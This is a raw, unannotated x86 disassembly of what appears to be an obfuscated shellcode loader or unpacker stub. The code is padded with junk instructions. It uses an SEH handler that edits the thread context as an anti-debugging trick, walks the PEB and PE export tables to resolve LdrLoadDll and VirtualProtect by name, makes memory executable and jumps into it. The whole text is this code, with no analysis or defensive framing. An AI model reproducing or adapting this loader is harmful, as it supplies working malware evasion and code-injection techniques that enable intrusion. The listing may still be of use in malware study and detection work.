_start
pushad
call $+5
mov [ esp ] edi
xor edi [ esp ]
and edx edx
sbb esp 0xfffffffc
push esp
or ecx ecx
adc edi 0x1
pop ecx
or eax eax
sbb edi 0xffffffff
sub ecx 0x4
sub edi 0xffffffff
neg edi
call $+5
sub [ ecx ] edi
retn
sub_11002039
mov edi 0x0
mov edx edi
test eax eax
mov esi 0x0
adc esi edi
add dx 0xffff
stc
sbb dl 0x0
mov dh dl
call $+5
add esi 0x1
sub eax eax
add eax [ esp ]
movzx ecx [ eax + esi - 0x2 ]
push edx
xor edx ecx
pop edx
jne r-xdata
add [ esp ] edi
jmp [ esp ]
and edi 0x0
or edi esi
sub_110020b7
push [ fs : 0x0 ]
add eax ecx
mov ebx 0x0
or ebx 0xffff
not edx
add eax ecx
mov [ fs : 0x0 ] esp
and eax edx
add eax ecx
test ebx ebx
jae r-xdata
call $+5
sub eax ecx
sub esp 0x4
mov [ esp ] edi
xor edi [ esp ]
and ebx ebx
sbb esp 0xfffffffc
mov edi [ eax ]
push 0x5a4d
pop esi
and edi ebx
add esp 0xfffffffc
mov [ esp ] esi
sub esi edi
pop esi
je r-xdata
call sub_110020b7
add esp 0xfffffffc
mov [ esp ] edx
mov edx 0x0
add edx [ esp + 0x10 ]
add [ edx + 0xb8 ] 0x1
add [ edx + 0xb8 ] 0x1
add esp 0x4
mov edx [ esp - 0x4 ]
xor eax eax
retn 0x10
add esp 0x4
mov edi [ esp - 0x4 ]
xor edi edi
xor edi [ esp ]
mov [ fs : 0x0 ] edi
add esp 0x8
or edx edx
mov ecx 0x0
adc ecx eax
and edi 0x0
add edi [ eax + 0x3c ]
and edi edi
adc eax edi
push 0x4550
pop edi
mov esi 0x0
sub esi [ eax ]
neg esi
sub esp 0x4
mov [ esp ] esi
and esi esi
sbb esi edi
pop esi
jne r-xdata
jmp [ esp ]
popad
test ebx ebx
mov eax 0x0
adc eax 0x1
retn 0xc
xor edi edi
add edi [ eax + 0x78 ]
sub eax eax
add eax edi
and eax eax
adc eax ecx
push eax
sub edi edi
add edi [ eax + 0x20 ]
and eax 0x0
or eax edi
add eax ecx
push ecx
call $+5
mov [ esp ] eax
mov esi [ esp ]
add esp 0x4
pop ebx
add esp 0xfffffffc
mov [ esp ] edx
xor edx [ esp ]
test edi edi
sbb esp 0xfffffffc
mov eax 0x0
sub eax esi
neg eax
mov ecx 0x0
sub ecx [ esi ]
neg ecx
xor esi esi
or esi ecx
call $+5
mov ebp 0x0
sub ebp esp
neg ebp
add esi ebx
push 0x6c6c
call $+5
mov [ esp ] 0x4464616f
sub esp 0x4
mov [ esp ] 0x4c72644c
mov edi 0x0
sub edi esp
neg edi
or eax eax
mov ecx 0x0
adc ecx 0xb
[ esi ] [ edi ]
je r-xdata
and esp 0x0
or esp ebp
pop esi
sub esp 0x4
mov [ esp ] ebx
push edx
pop edx
pop ecx
add esp 0x4
mov eax [ esp - 0x4 ]
push eax
pop ebx
mov edi 0x0
xor edi [ eax + 0x24 ]
mov eax 0x0
add eax edi
or eax eax
adc eax ecx
sub edi edi
add edi [ eax + edx * 2 ]
and edi 0xffff
push edi
pop edx
xor edi edi
or edi [ ebx + 0x10 ]
sub edx edi
sub edx 0xffffffff
sub eax eax
add eax [ ebx + 0x1c ]
add eax ecx
and edi 0x0
or edi [ eax + edx * 4 ]
add ecx edi
mov ebp 0x0
or ebp esp
call $+5
mov [ esp ] edi
xor edi [ esp ]
add esp 0x4
sub esp 0x4
mov [ esp ] edi
xor eax eax
or eax esp
sub esp 0x4
mov [ esp ] edi
call $+5
mov [ esp ] 0x6c006c
sub esp 0x4
mov [ esp ] 0x64002e
add esp 0xfffffffc
mov [ esp ] 0x320033
call $+5
mov [ esp ] 0x6c0065
push 0x6e0072
push 0x65006b
push esp
sub esp 0x4
mov [ esp ] 0x1a0018
mov esi 0x0
or esi esp
sub esp 0x4
mov [ esp ] eax
call $+5
mov [ esp ] esi
push edi
push edi
add esp 0xfffffffc
mov [ esp ] ecx
sub esp 0x4
mov [ esp ] eax
mov esi [ esp ]
add esp 0x4
mov ebx [ esp ]
add esp 0x4
call ebx
mov eax [ esi ]
add esp 0xfffffffc
mov [ esp ] eax
pop edi
mov esi 0x0
sub esi [ fs : 0x30 ]
neg esi
mov ecx 0x0
xor ecx [ esi + 0x10 ]
mov [ ecx + 0x18 ] edi
xor esp esp
add esp ebp
mov esi [ fs : 0x30 ]
push [ esi + 0x10 ]
pop ecx
xor eax eax
or eax [ ecx + 0x18 ]
mov ecx 0x0
xor ecx eax
and edi 0x0
add edi [ eax + 0x3c ]
add eax edi
xor edi edi
add edi [ eax + 0x78 ]
and eax 0x0
add eax edi
test ebx ebx
adc eax ecx
add esp 0xfffffffc
mov [ esp ] eax
xor edi edi
xor edi [ eax + 0x20 ]
and eax 0x0
add eax edi
and eax eax
adc eax ecx
add esp 0xfffffffc
mov [ esp ] ecx
add esp 0xfffffffc
mov [ esp ] eax
add esp 0x4
mov esi [ esp - 0x4 ]
mov ebx [ esp ]
add esp 0x4
xor edx edx
mov eax 0x0
add eax esi
or esi esi
mov ecx 0x0
adc ecx [ esi ]
sub esi esi
add esi ecx
call $+5
mov ebp 0x0
or ebp esp
and edx edx
adc esi ebx
add esp 0xfffffffc
mov [ esp ] 0x7463
push 0x65746f72
sub esp 0x4
mov [ esp ] 0x506c6175
call $+5
mov [ esp ] 0x74726956
and ecx ecx
mov edi 0x0
adc edi esp
mov ecx 0x0
sub ecx 0xf
neg ecx
[ esi ] [ edi ]
je r-xdata
test esi esi
adc edx 0x1
add eax 0x4
xor esi esi
xor esi [ eax ]
sub esp esp
add esp ebp
jmp [ esp ]
xor esp esp
xor esp ebp
pop esi
call $+5
mov [ esp ] ebx
push edx
pop edx
mov ecx [ esp ]
add esp 0x4
add esp 0x4
mov eax [ esp - 0x4 ]
and ebx 0x0
add ebx eax
and edi 0x0
or edi [ eax + 0x24 ]
mov eax 0x0
or eax edi
add eax ecx
push [ eax + edx * 2 ]
pop edi
and edi 0xffff
sub edx edx
add edx edi
and edi 0x0
add edi [ ebx + 0x10 ]
or edx edx
sbb edx edi
and ebx ebx
sbb edx 0xffffffff
mov eax 0x0
or eax [ ebx + 0x1c ]
add eax ecx
sub edi edi
add edi [ eax + edx * 4 ]
and edx edx
adc ecx edi
xor ebx ebx
xor ebx 0x1000
call $+5
add esp 0x4
mov eax [ esp - 0x4 ]
and eax 0xfffff000
or ebx ebx
adc eax ebx
and ebx ebx
adc eax ebx
push eax
mov esi 0x0
xor esi 0x4
call $+5
or edx edx
adc eax ebx
and edi 0x0
or edi [ eax ]
test ecx ecx
sbb esi 0x1
je r-xdata
and ebx ebx
sbb edx 0xffffffff
and ebx ebx
adc eax 0x4
push [ eax ]
pop esi
test ecx ecx
mov esp 0x0
adc esp ebp
jmp [ esp ]
add esp 0x4
mov edi [ esp - 0x4 ]
pop eax
push edi
push esp
push 0x40
call $+5
mov [ esp ] 0x45c6
call $+5
mov [ esp ] eax
add esp 0xfffffffc
mov [ esp ] ecx
add esp 0xfffffffc
mov [ esp ] eax
add esp 0x4
mov esi [ esp - 0x4 ]
pop ebx
call $+5
pop eax
test edi edi
adc eax 0x1b
push eax
add esp 0xfffffffc
mov [ esp ] ebp
mov ebp 0x0
sub ebp esp
neg ebp
add ebx 0x5
jmp ebx
jmp [ esp ]
